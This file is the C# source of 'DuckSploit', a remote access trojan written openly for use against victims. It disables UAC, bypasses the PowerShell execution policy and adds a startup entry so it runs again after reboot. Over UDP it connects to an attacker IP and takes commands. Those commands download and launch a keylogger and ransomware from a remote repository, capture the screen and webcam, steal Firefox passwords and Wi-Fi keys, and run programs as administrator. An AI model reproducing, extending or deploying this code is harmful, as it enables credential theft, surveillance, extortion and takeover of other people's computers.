using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.IO.Compression;
using System.Web;
using System.Threading;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Windows;
using System.Windows.Forms;
using System.Reflection;

namespace DuckSploit
{
	public class Program
	{					
		public static void Download(string url, string outPath)
		{
			string tempdir = Path.GetTempPath();
			
			execute_cmd("if exist " + tempdir + "\\download.ps1 (del " + tempdir + "\\download.ps1)");			
			
			outPath = outPath.Replace("\\", "/");
			url = '"' + url + '"';
			
			outPath = '"' + outPath + '"';
			
			string str = "(New-Object System.Net.WebClient).DownloadFile(" + url + ", " + outPath + ")";
			
			outPath = tempdir + "\\download.ps1";
			
            // open or create file
            FileStream streamfile = new FileStream(outPath, FileMode.OpenOrCreate, FileAccess.Write);
            // create stream writer
            StreamWriter streamwrite = new StreamWriter(streamfile);
            // add some lines
			
			outPath = '"' + tempdir + "\\download.ps1" + '"';
			
			
			// string powershelldownloadtxt = "" + url +"\  "
            streamwrite.WriteLine(str);
            // clear streamwrite data
            streamwrite.Flush();
            // close stream writer
            streamwrite.Close();
            // close stream file
            streamfile.Close();
			

			// string error = "";
			// int exitCode = 0;
			string output = "";
			
			ProcessStartInfo processInfo;
			Process process;
			processInfo = new ProcessStartInfo("cmd.exe", "/c powershell " + tempdir + "\\download.ps1");
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
			output = process.StandardOutput.ReadToEnd();
			
		}
		public static void write_txt_to_file(string path, string str)
		{
			FileStream streamfile = new FileStream(path, FileMode.OpenOrCreate, FileAccess.Write);
            // create stream writer
            StreamWriter streamwrite = new StreamWriter(streamfile);
            // add some lines
			
            streamwrite.WriteLine(str);
            // clear streamwrite data
            streamwrite.Flush();
            // close stream writer
            streamwrite.Close();
            // close stream file
            streamfile.Close();
		}
		public static void execute(string path)
        {
            
			
			string callcommand = "/c call " + path ;
			
			ProcessStartInfo processInfo;
			Process process;
			
			string output = "";
			
			processInfo = new ProcessStartInfo("cmd.exe", callcommand);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
			output = process.StandardOutput.ReadToEnd();
        }
		public static void execute_cmd(string cmd)
        {
            
			
			string callcommand = "/c " + cmd ;
			
			ProcessStartInfo processInfo;
			Process process;
			
			string output = "";
			
			processInfo = new ProcessStartInfo("cmd.exe", callcommand);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
			output = process.StandardOutput.ReadToEnd();
        }
		public static void execute_cmd_asadmin(string cmd)
        {
			string callcommand2 = "start-process cmd -verb runas -ArgumentList '/c " + cmd + "'";
			
			ProcessStartInfo processInfo;
			Process process;
			
			string output = "";
			
			processInfo = new ProcessStartInfo("powershell.exe", callcommand2);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
			output = process.StandardOutput.ReadToEnd();
        }
		public static void host()
		{
			string tempdir2 = Path.GetTempPath(); 
			string output = "";
			
			if(Directory.Exists(tempdir2 + "\\host\\host"))
			{
				execute_cmd("start " + tempdir2 + "\\host\\host\\launch.vbs");
			}
			else
			{
				// get host.zip
				Download("https://github.com/canarddu38/DUCKSPLOIT/raw/root/api/host/host.zip",tempdir2 + "/host.zip");
				execute_cmd("powershell Expand-Archive -Path $env:TEMP\\host.zip -DestinationPath $env:TEMP\\host");
				
				execute_cmd("start " + tempdir2 + "\\host\\host\\launch.vbs");
			}
			IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 0);
			string username = Environment.UserName;
			string ipv44 = RemoteIpEndPoint.Address.ToString();
			string ipv66 = get_ipv6();
			
			string text = File.ReadAllText(tempdir2 + "\\host\\host\\pannel\\user_infos.txt");
			text = text.Replace("Username: <null>", "Username: " + username);
			text = text.Replace("IPV4: <null>", "IPV4: " + ipv44);
			text = text.Replace("IPV6: <null>", "IPV6: " + ipv66);
			text = text.Replace("NetworkIP: <null>", "NetworkSSID: " + get_ssid());
			File.WriteAllText(tempdir2 + "\\host\\host\\pannel\\user_infos.txt", text);
		}
		public static string get_ipv6()
        {
            try
            {
                string strHostName = System.Net.Dns.GetHostName();
                IPHostEntry ipEntry = System.Net.Dns.GetHostEntry(strHostName);
                IPAddress[] addr = ipEntry.AddressList;
                Console.WriteLine("Local Ipv4 IP Address: "+addr[addr.Length - 1].ToString());
                if (addr[0].AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6)
                {
                    return addr[0].ToString();
                }
				else
				{
					return "nope1";
				}
            }
            catch (Exception) {
				return "nope2";
			}
				
        }
		public static string get_ssid()
		{  
			var process = new Process
			{
				StartInfo =
				{
				FileName = "netsh.exe",
				Arguments = "wlan show interfaces",
				UseShellExecute = false,
				RedirectStandardOutput = true,
				CreateNoWindow = true
				}
			};
			process.Start();

			var output = process.StandardOutput.ReadToEnd();
			var line = output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries).FirstOrDefault(l => l.Contains("SSID") && !l.Contains("BSSID"));
			if (line == null)
			{
				return string.Empty;
			}
			var ssid = line.Split(new[] { ":" }, StringSplitOptions.RemoveEmptyEntries)[1].TrimStart();
			return ssid;
		}  
		public static string get_networkinfos()
		{  
			var process = new Process
			{
				StartInfo =
				{
				FileName = "netsh.exe",
				Arguments = "wlan show profile "+ get_ssid() + " key=clear",
				UseShellExecute = false,
				RedirectStandardOutput = true,
				CreateNoWindow = true
				}
			};
			process.Start();

			var resulttt = process.StandardOutput.ReadToEnd();
			return resulttt;
		} 	
		public static bool check_args(string args, int a)
		{
			if(args == a.ToString())
			{
				return true;
			}
			else
			{
				return false;
			}
		}
		public static void Main(string[] args)
		{
			string tempdir = Path.GetTempPath();  
			
			execute_cmd_asadmin("powershell.exe -WindowStyle hidden Set-ExecutionPolicy bypass -Force");
			
			
			tempdir = Path.GetTempPath(); 
			Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/uac/disable.vbs", tempdir + "\\uacdisable.vbs");
			execute_cmd_asadmin("powershell.exe -WindowStyle hidden Start-Process " + tempdir + "\\uacdisable.vbs");
			
			host();
			
			string output = "";

			UdpClient udpClient = new UdpClient(0);

			try{
				tempdir = Path.GetTempPath(); 
				udpClient.Connect(<your ip>, 53);

				Byte[] sendBytes = Encoding.ASCII.GetBytes("Connected!");

				udpClient.Send(sendBytes, sendBytes.Length);

				IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 0);

				while(true){
					tempdir = Path.GetTempPath(); 
					Byte[] receiveBytes = udpClient.Receive(ref RemoteIpEndPoint);
					string returnData = Encoding.ASCII.GetString(receiveBytes);
					
					
					
					
					// Console.WriteLine("Received command from " + RemoteIpEndPoint.Address.ToString());
					
					output = "";
					string ipv4 = "";
					string hostname = Dns.GetHostName();

					
					
					string[] result = returnData.Split(' ');
					
					// string output = "null";
		
					if(result[0] == "help")
					{
						output = "";
					}
					else if(result[0] == "exit")
					{
						System.Environment.Exit(1);
					}
					else if(result[0] == "download")
					{
						if(result.Length == 3)
						{
							output = "This file successfully downloaded to " + result[2];
							string downloadurl = result[1];
							string downloadpath = result[2];
							Download(downloadurl, downloadpath);
						}
						else
						{
							output = "Usage: download <url> <path>";
						}
						
						
						
					}
					else if(result[0] == "malware")
					{
						if(result.Length == 2)
						{
							if(result[1] == "keylogger")
							{
								output = "Keylogger started, see keyloggs at http://{vicitm IP}:8080/keylogger/keylogg.txt";
								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/malwares/keylogger.vbs", tempdir + "\\keylogger.vbs");
							
								execute_cmd("start " + tempdir + "\\keylogger.vbs");
							}
							else if(result[1] == "--help")
							{
								output = "";
							}
							else if(result[1] == "ransomware")
							{
								output = "Ransomwared!";
								// Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/blockmousenkeyboard.ps1", tempdir + "/ransomware2.ps1");
								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/malwares/ransomware.bat", tempdir + "/ransomware.bat");
								
								execute_cmd_asadmin("start " + tempdir + "\\ransomware.bat");
							}
							else
							{
								output = "Arg not found!";
							}
						}
						else
						{
							output = "malware --help to get malware list";
						}
					}
					else if(result[0] == "screenshot")
					{
						output = "A screenshot appears at http://<victim ip>/screenshots";
						Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/screenshot.ps1", tempdir + "\\screenshot.ps1");
						execute_cmd("powershell.exe " + tempdir + "\\screenshot.ps1");
					}
					else if(result[0] == "webcam_snap")
					{
						DateTime dateTime = DateTime.UtcNow.Date;
						output = "Webcam snap taken! ";
						Download("https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe", tempdir + "\\cam.exe");
						execute_cmd("call " + tempdir + "\\cam.exe /filename " + tempdir + "\\host\\host\\pannel\\screenshots\\webcam_" + dateTime.ToString() + ".png");
					}
					else if(result[0] == "open")
					{
						if(result.Length == 3)
						{
							if(result[1] == "--asadmin")
							{
								execute_cmd_asadmin("start " + result[2]);
								output = result[2] + " has been started as admin!";
							}	
							else
							{
								execute_cmd("start " + result[1] + result[2]);
								output = result[1] + " has been started!";
							}
						}
						else if(result.Length == 2)
						{
							execute_cmd("start " + result[1]);
							output = result[1] + " has been started!";
						}
						else
						{
							output = "Usage: open [--asadmin] <package>, to start selected package";
						}
					}
					else if(result[0] == "info")
					{
						ipv4 = RemoteIpEndPoint.Address.ToString();
						
						string line1 = "Username: " + Environment.UserName;
						string line2 = "IPV4: " + ipv4;
						string line3 = "IPV6: " + get_ipv6();
						string line4 = "HostName: " + hostname;
						string line5 = "Network SSID: " + get_ssid();
						string line6 = "Latitude: ";
						string line7 = "Longitude: ";
						string jumpline = @"
";
						output = line1 + jumpline + line2 + jumpline + line3 + jumpline + line4 + jumpline + line5 + jumpline + line6 + jumpline + line7;
					}
					else if(result[0] == "network_info")
					{
						output = get_networkinfos();
					}
					else if(result[0] == "skull")
					{
						Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/troll/skull.bat", tempdir + "\\skull.bat");
						output = "A scary Skull with crossbones spawned! ";
						execute_cmd("start cmd /c \"start " + tempdir + "\\skull.bat\"");
					}
					else if(result[0] == "rickroll")
					{
						output = "Victim just get rickrolled";
						execute_cmd("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");
					}
					else if(result[0] == "uninstall")
					{
						output = "[o] Ds is now uninstalled from victim's computer! ";
						break;
					}
					else if(result[0] == "locatemouse")
					{
						Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/locatemouse.ps1", tempdir + "\\locatemouse.ps1");
						execute_cmd("(powershell %temp%\\locatemouse.ps1) > %temp%\\mouselocation.txt");
						output = File.ReadAllText(tempdir + "\\mouselocation.txt");
					}
					else if(result[0] == "mouseclick")
					{
						
					}
					else if(result[0] == "mousemove")
					{
						if(check_args(result.Length.ToString(), 3))
						{
							Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/mousemove.vbs", tempdir + "/mousemove.vbs");
							execute_cmd("call %temp%/mousemove.vbs " + result[1] + " " + result[2]);
							output = "Mouse successfully moved! ";
						}
						else
						{
							output = "Usage: mouseclick <x> <y> ";
						}
					}
					else if(result[0] == "msg")
					{
						if(result.Length == 4)
						{
							write_txt_to_file(tempdir + "/msg.vbs", "MsgBox \"" + result[2] + "\" & vbCrLf & \"" + result[3] + "\" ,16, \"" + result[1] + "\"");
							execute(tempdir + "\\msg.vbs");
							output = "Sended message!";
						}
						else
						{
							output = "Usage: msg <title> <line1> <line2>!";
						}
					}
					else if(result[0] == "notif")
					{
						if(result.Length == 3)
						{
							Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/notif.ps1", tempdir + "\\notif.ps1");
							string text = File.ReadAllText(tempdir + "\\notif.ps1");
							text = text.Replace("<title>", '"' + result[1] + '"');
							text = text.Replace("<message>", '"' + result[2] + '"');
							File.WriteAllText(tempdir + "\\notif.ps1", text);
							execute_cmd("powershell " + tempdir + "\\notif.ps1");
						}
						else
						{
							output = "Usage: notif <title> <message>";
						}
					}
					else if(result[0] == "desktop_stream")
					{
						if(result.Length == 2)
						{
							if(result[1] == "start")
							{
								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/desktop_stream.ps1", tempdir + "/deskop_stream.ps1");
								execute_cmd("poweshell " + tempdir + "/deskop_stream.ps1");
								output = "Desktop stream started at <victim IP>/desktop_stream.html";
							}
							else if(result[1] == "stop")
							{
								execute_cmd("taskkill /IM powershell.exe /f");
								output = "Desktop Stream successfully shuted down! ";
							}
						}else{
							output = "Usage: desktop_stream <start/stop>";
						}
					}
					else if(result[0] == "startup")
					{
						if(result.Length == 2)
						{
							if(result[1] == "reload")
							{
								output = "Now when victim's computer will reboot/startup he'll reload connection";
								string appdata = System.Environment.GetEnvironmentVariable("APPDATA");
								execute_cmd("mkdir \""+appdata+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
								string execPath = Assembly.GetEntryAssembly().Location;
								try 
								{
									File.Delete(tempdir+"\\ds.exe");
									File.Copy(execPath, tempdir+"\\ds.exe");
								}catch (Exception e ) {
									File.Copy(execPath, tempdir+"\\ds.exe");
								}
								write_txt_to_file(appdata+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ds_startup.bat", "@echo off&powershell.exe -WindowStyle hidden %temp%\\ds.exe");
							}
							else if(result[1] == "stop")
							{
								execute_cmd("taskkill /IM powershell.exe /f");
								output = "Desktop Stream successfully shuted down! ";
							}
						}else{
							output = "Usage: desktop_stream <start/stop>";
						}
					}
					else if(result[0] == "host")
					{
						try{
							if(result[1] == "start")
							{
								output = "Hosting system started!";
								host();
							}
							else if(result[1] == "stop")
							{
								output = "Hosting system stopped!";
								execute_cmd("taskkill /IM node.exe /f");
							}
							else
							{
								output = "Usage: host <start/stop>";
							}
						}catch (Exception e ) {
							output = "Usage: host <start/stop>";
						}
					}
					else if(result[0] == "steal_pwd")
					{
						if(result.Length == 2)
						{
							if(result[1] == "firefox")
							{
								execute_cmd("mkdir " + tempdir + "\\firefox_stealing");
								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/stealing/firefox/Find-FirefoxFiles.ps1", tempdir + "\\firefox_stealing\\Find-FirefoxFiles.ps1");
								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/stealing/firefox/Get-FirefoxPasswords.ps1", tempdir + "\\firefox_stealing\\Get-FirefoxPasswords.ps1");
								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/stealing/firefox/steal_firefox_passwords.ps1", tempdir + "\\firefox_stealing\\steal_firefox_passwords.ps1");
								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/stealing/firefox/ConvertFrom-NSS.ps1", tempdir + "\\firefox_stealing\\ConvertFrom-NSS.ps1");
								execute_cmd("(powershell.exe %temp%\\firefox_stealing\\steal_firefox_passwords.ps1) > %temp%\\output_firefox.txt");
								output = File.ReadAllText(tempdir + "\\output_firefox.txt");
								
							}
							else if(result[1] == "google")
							{
								output = "will be added soon ;)";
							}
							else
							{
								output = "Usage: steal_pwd <firefox/google>";
							}
							
						}
						else
						{
							output = "Usage: steal_pwd <firefox/google>";
						}
					}
					else
					{
						if(result[0] == "")
						{}
						else
						{
							output = "Unknown command \"" + result[0] + "\"";
						}
					}
					output = "\n" + output + "\n";
					Byte[] outputtobytes = Encoding.ASCII.GetBytes(output);
					udpClient.Send(outputtobytes, outputtobytes.Length);

				}
				// udpClient.End();

			}
			catch (Exception e ) {
				Console.WriteLine(e.ToString());
			}

		}

	}
}
